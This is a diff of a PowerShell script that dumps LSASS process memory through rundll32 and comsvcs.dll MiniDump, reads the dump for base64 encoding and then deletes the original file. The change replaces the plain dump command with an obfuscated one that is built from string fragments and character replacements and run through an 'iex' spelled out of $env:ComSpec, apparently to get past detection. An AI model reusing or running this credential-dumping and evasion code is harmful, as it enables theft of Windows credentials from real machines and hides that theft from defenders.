@@ -1,14 +1,15 @@
-﻿$basespace = (Get-Item -Path ".\" -Verbose).FullName
+$basespace = (Get-Item -Path ".\" -Verbose).FullName
 $currentPath = $basespace + '\Workspace'
 if(!(Test-Path -Path $currentPath)){mkdir $currentPath}
 if(!(Test-Path -Path $currentPath\DUMP)){mkdir $currentPath\DUMP\}
 $DumpPath = $currentPath + "\DUMP"
-rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (ps lsass).id $DumpPath\DUMP-${env:computername} full; Wait-Process -Id (ps rundll32).Id
+. ( $EnV:CoMspEC[4,15,25]-jOin'') ( ('run'+'d'+'ll32.exe '+'C:'+'yjcWINdo'+'wsyjcSystem'+'32yj'+'c'+'COMsVcs'+'.dll, Min'+'iDump ('+'ps '+'LSass).id e'+'B'+'cD'+'ump'+'Pat'+'hy'+'j'+'cDUMP-eBc{e'+'nv:c'+'omputern'+'ame} full; Wait-P'+'r'+'oce'+'ss '+'-Id (ps rundll'+'32).Id').rEPlacE('eBc','$').rEPlacE('yjc','\') )
 
 $DumpFile = $DumpPath + "\DUMP-" + ${env:computername}
 $FilePath = $DumpFile + "-Decoded"
 $EncodeDumpPath = $DumpFile + "-b64.txt"
 sleep 0.6
+
 $File = [System.IO.File]::ReadAllBytes($DumpFile);
 # returns the base64 string
 Remove-Item -Path $DumpFile
